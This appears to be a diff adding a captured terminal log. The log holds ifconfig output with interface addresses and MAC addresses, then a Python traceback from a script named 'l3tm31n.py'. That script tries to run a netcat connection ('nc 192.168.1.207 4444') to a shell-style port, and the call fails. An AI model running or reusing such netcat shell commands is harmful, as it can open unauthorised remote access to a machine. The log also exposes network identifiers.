@@ -1,0 +1,31 @@
+eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 00:68:eb:db:af:f1  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 16  bytes 880 (880.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 16  bytes 880 (880.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.207  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 2001:b07:6463:85ac:7673:5940:e3cb:4101  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::7e97:e88:83ea:ea82  prefixlen 64  scopeid 0x20<link>
+        ether 40:5b:d8:a4:3f:45  txqueuelen 1000  (Ethernet)
+        RX packets 196353  bytes 197127055 (187.9 MiB)
+        RX errors 0  dropped 1293  overruns 0  frame 0
+        TX packets 94397  bytes 22331982 (21.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+Thanks
+Traceback (most recent call last):
+  File "l3tm31n.py", line 4, in <module>
+    os.execute("nc 192.168.1.207 4444")
+AttributeError: 'module' object has no attribute 'execute'
